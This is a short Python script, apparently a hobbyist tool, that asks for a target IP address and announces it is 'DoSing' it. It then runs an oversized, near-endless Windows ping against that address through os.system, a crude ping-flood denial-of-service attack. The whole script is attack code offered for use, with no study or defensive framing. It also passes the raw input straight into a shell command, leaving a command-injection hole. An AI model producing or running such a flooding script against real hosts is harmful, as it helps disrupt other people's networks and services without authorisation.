#Le importing
import os

#Le inputing ip
ip = input("IP: ")

#Le dos
print("DoSing " + ip + (" Please wait"))
os.system("ping " + ip + " -t -n 4294967295 -l 65500")